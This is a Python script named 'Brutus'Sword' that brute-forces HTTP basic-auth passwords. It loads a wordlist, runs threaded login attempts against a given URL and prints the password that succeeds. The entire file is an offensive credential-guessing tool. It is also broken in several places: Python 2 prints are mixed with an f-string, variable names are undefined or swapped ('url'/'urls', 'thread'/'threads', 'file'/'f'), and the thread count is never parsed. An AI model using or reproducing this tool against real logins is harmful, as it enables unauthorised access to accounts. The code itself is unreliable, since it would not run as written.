#!/usr/bin/env python3
import requests
from threading import Thread
import sys
import getopt

global hit
hit="1"
class request_performer(Thread):
	def __init__(self,passwd,users,urls):
		Thread.__init__(self)
		self.password=passwd.split("\n")[0]
		self.username=users
		self.url=url
		print "-" + self.password + "-"
	def run(self):
		global hit
		if hit == "1":
			try:
				r=requests.get(self.url,auth=(self.username,self.password))
				if r.status_code==200:
					hit="0"
					print "Password Found: "+self.password
					sys.exit()
				else:
					print self.password + "is not valid"
					i[0]=i[0]-1
			except Exception as e:
				print f"Error:{str(e)}"
def banner():
	print "######################"
	print "*    Brutus'Sword    *"
	print "######################"
def launcher_thread(passwords,threads,urls,users):
	global i
	i=[]
	i.append(0)
	while len(passwords):
		if hit == "1":
			try:
				if i[0]<threads:
					passwd=passwords.pop(0)
					i[0]=i[0]+1
					threads=request_performer(passwd,users,urls)
					thread.start()
			except KeyboardInterrupt:
				print "Interrupted"
				sys.exit()
			threads.join()

def start(argv):
	banner()
	try:
		opts,args=getopt.getopt(argv,"u:w:f:t")
	except getopt.GetoptError:
		print "Error in arguments"
		sys.exit()
	for opt,arg in opts:
		if opt == '-u':
			user=arg
		elif opt == '-w':
			url=arg
		elif opt == '-f':
			passfile=arg
		elif opt == '-t':
			threads=arg
	try:
		f=open(passfile,"r")
		passwords=file.readlines()
	except:
		print "Error:Unable to open file"
	launcher_thread(passwords,threads,urls,users)

if __name__=="__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print("Interrupted!")
